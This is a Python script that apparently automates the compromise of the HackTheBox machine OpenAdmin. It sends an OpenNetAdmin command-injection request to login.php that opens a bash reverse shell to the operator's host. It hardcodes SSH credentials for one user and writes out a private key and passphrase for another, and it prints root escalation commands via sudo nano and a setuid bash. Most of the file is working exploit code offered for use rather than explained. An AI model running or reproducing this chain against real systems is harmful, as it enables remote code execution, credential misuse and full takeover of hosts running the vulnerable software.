
import sys
import time as cm
import subprocess
import paramiko
import paramiko.ssh_exception
from pwn import *
import requests
import re
import socket
from bs4 import BeautifulSoup
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    bnn = """
                                                  ______
                                               .-"      "-.       ▓█████ ▄████▄   ██░ ██  ██ ▄█▀    
                                              /            /      ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒            
                                             |              |     ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░        
                                             |,  .-.  .-.  ,|     ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ 
                                             | )(_o/  \o_)( |     ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄
                                             |/     /\     \|     ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒  
                                   (@_       (_     ^^     _)      ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░
                              _     ) \_______\__|IIIIII|__/_____  ░  ░         ░  ░░ ░░ ░░ ░ 
                             (_)@8@8{}<________|-\IIIIII/-|___________________________>
                                    )_/        \          /
                                   (@           `--------`
    """
    print(Fore.RED + f"{bnn}")

global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.171"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print(Fore.CYAN + f"\t\t\t~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t [HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Exploit File] > " + Fore.YELLOW + f"http://{target_machine}/ona/login.php")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked OpenAdmin Network")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

def register_user_and_exploti_www():
    try:
        check_connection_rce=commands_send("ps aux | grep \"nc -nlvp 9001\" | awk '{print $9}' FS=" " | awk '{print $NF}'")
        send_exploit_rce=commands_send(f'curl --silent -d "xajax=window_submit&xajaxr=1742140805635&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";bash+-c+\'bash+-i+>%26+/dev/tcp/{machine_ip}/9001+0>%261\';echo \"END\"&xajaxargs[]=ping" "http://{target_machine}/ona/login.php" & 2>/dev/null')
        cm.sleep(.2)
        date_now=commands_send("date +%I:%M")
        if check_connection_rce == date_now:
            print("")
        else:
            print("")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

def unlocked(): 
    try:
        checker_status()
        user_default_hackthebox()
        
        # Menu seleccionar usuario a conectarse. www-data, jimmy, joanna, root
        while True:
            users=["www-data", "jimmy", "joanna", "root", "exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "jimmy"
            password = "n1nj4W4rri0R!"
            
            print(Fore.MAGENTA + f"\n\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t~ What ur user select? > "))
            
            if user_call == 1:
                print(Fore.CYAN + f"\n\t\t\t ~ [Connection to www-data :)]\n")
                print(Fore.BLUE + f"\t\t\t\t\t[Exploit - Waiting connection to www-data]")
                print(Fore.RED + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.GREEN + f"Please listening port 9001, use > nc -nlvp 9001")
                input(f"\t\t\t\t    [Exploit RCE - Call] > " + Fore.GREEN + f"Press enter if you listen on port 9001 :)")
                cm.sleep(.5)
                register_user_and_exploti_www()
                cm.sleep(1)
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit RCE - Message] > " + Fore.MAGENTA + f"Closed www-data userpass")
                continue
            
            elif user_call == 2:
                try:
                    print(Fore.CYAN + f"\n\t\t\t ~ [Connection to jimmy :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credential Path] > " + Fore.GREEN + f"/opt/ona/www/local/config/database_settings.inc.php")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {username}, Password: {password}")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    shell.settimeout(1)
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        time.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")

                    shell.close()
                    client.close()
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
                
            
            elif user_call == 3:
                print(Fore.CYAN + f"\n\t\t\t ~ [Connection to joanna :)]\n")
                
                commands_send("""echo '-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----' > id_rsa""")
                
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Path/id_rsa] > " + Fore.GREEN + f"http://127.0.0.1:52846 - [id_rsa succeslly created.]")
                cm.sleep(1)
                commands_send("chmod 600 id_rsa")
                cm.sleep(1)
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.BLUE + f"$ Use > " + Fore.CYAN + "ssh -i id_rsa joanna@10.10.10.171")
                cm.sleep(1)
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message Credentials] > " + Fore.BLUE + f"$ Password use id_rsa > " + Fore.CYAN + "bloodninjas")
                break

            elif user_call == 4:
                print(Fore.CYAN + f"\n\t\t ~ [Connection to root :)]\n")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.BLUE + f"$ For exploit root user, connect to joanna.")
                cm.sleep(1)
                # sudo -u root nano /opt/priv
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message Command] > " + Fore.BLUE + f"$ Use command > " + Fore.CYAN + "sudo -u root nano /opt/priv")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message Command] > $" + Fore.CYAN + " 'CTRL + R | CTRL + X' " + Fore.BLUE + "and use > " + Fore.CYAN + "chmod 4655 /bin/bash")
                cm.sleep(1)            
                break
            
            elif user_call == 5:
                print(Fore.GREEN + f"\n\t\t\t\t\t\t[Exploit Message - Exit Pwned] :/")
                print(Fore.GREEN + f"\t\t\t\t\t\t        [G00d H4ck1ng :@ ]\n")
                break
            else:
                break
    except subprocess.CalledProcessError as e:
        print(f"Function main {e}")


if __name__ == '__main__':
    banner()
    unlocked()
